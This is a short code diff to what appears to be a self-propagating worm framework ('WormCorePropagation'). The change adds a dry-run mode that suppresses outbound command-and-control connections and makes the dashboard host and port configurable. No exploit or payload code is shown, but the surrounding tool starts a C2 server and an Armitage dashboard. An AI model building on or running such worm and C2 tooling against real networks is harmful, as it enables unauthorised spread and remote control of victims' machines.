@@ -292,18 +292,24 @@ class WormCorePropagation:
             logger.info("Host Monitor started (continuous monitoring + self-healing)")
 
         if self.c2_server:
-            try:
-                self.c2_server.run_background()
-                logger.info(
-                    f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}"
-                )
-            except Exception as e:
-                logger.warning(f"Failed to start C2 Server: {e}")
+            if self.dry_run:
+                # dry-run promise: no outbound C2 connections at all
+                logger.info("C2 client connections suppressed (dry-run)")
+            else:
+                try:
+                    self.c2_server.run_background()
+                    logger.info(
+                        f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}"
+                    )
+                except Exception as e:
+                    logger.warning(f"Failed to start C2 Server: {e}")
 
         if self.web_dashboard:
             try:
                 self.web_dashboard.run_background()
-                logger.info("Web Dashboard started at http://0.0.0.0:5000")
+                logger.info(
+                    f"Web Dashboard started at http://{self.web_dashboard.host}:{self.web_dashboard.port}"
+                )
                 time.sleep(1)
                 try:
                     import webbrowser
@@ -317,7 +323,9 @@ class WormCorePropagation:
         if self.armitage_dashboard:
             try:
                 self.armitage_dashboard.run_background()
-                logger.info("Armitage Dashboard started at http://0.0.0.0:5001")
+                logger.info(
+                    f"Armitage Dashboard started at http://{self.armitage_dashboard.host}:{self.armitage_dashboard.port}"
+                )
                 time.sleep(1)
                 try:
                     import webbrowser
